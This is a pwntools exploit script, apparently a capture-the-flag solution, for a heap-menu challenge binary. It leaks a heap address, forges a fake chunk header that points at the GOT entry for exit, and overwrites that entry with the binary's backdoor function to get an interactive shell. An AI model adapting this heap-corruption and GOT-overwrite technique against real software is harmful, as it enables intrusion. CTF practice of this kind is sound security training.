from pwn import *


context.binary = e = ELF("./service/challenge")

p = remote("localhost",33456)#process()

def add(p, s, l, v):
    p.sendlineafter(b"Your choice: ", b"1")
    p.sendlineafter(b"Enter length", str(l).encode())
    p.sendlineafter(b"Enter string: ", s)
    p.sendlineafter(b"Enter value: ", str(v).encode())

def edit(p, s, l, v):
    p.sendlineafter(b"Your choice: ", b"2")
    p.sendlineafter(b"Enter length", str(l).encode())
    p.sendlineafter(b"Enter string: ", s)
    p.sendlineafter(b"Enter value: ", str(v).encode())

def delete(p):
    p.sendlineafter(b"Your choice: ", b"3")
    p.recvuntil(b"The largest element is '")
    string = p.recvuntil(b"'")[:-1]
    p.recvuntil(b"with a value of ")
    return string, int(p.recvline())

if __name__ == '__main__':
    

    # Massive amounts of heap manipulation
    add(p, b"aaa", 1000, 1337) # Top chunk
    add(p, b"bbb", 40, 1336) # Chunk 2
    edit(p, b"aaa", 400, 1335)
    edit(p, b"bbb", 560, 1334)
    edit(p, b"aaa", 384, 1333)

    add(p, b"ccc", 10, 1300)

    edit(p, b"bbb", 10, 1330)

    p.recvuntil(b"The heap:")
    p.recvline()
    p.recvline()
    leak = int(p.recvline())

    base = leak - 0x4b0
    print(hex(base))
    e.address = base - e.sym.mem

    
    pl = b"a"*(1160-724)
    # reconstruct overwritten chunk
    pl +=  p64(1330) + p64(0) + p64(0) + p64(base + 0x220) + p64(0x2a2)
    # Fake chunk header
    # Try to keep most field constant. Heap will rebalance this chunk to the top soon (hopefully)
    pl += b"\xff"*8 + p64(base + 0x208) + p64(0) + p64(base + 0x6bc) + p64(e.got.exit)

    edit(p, pl, 1000, 1337)

    edit(p, b"aaa", 10, base + 0x4b0)

    edit(p, p64(e.sym.backdoor), 8, 1337)
    
    p.interactive()
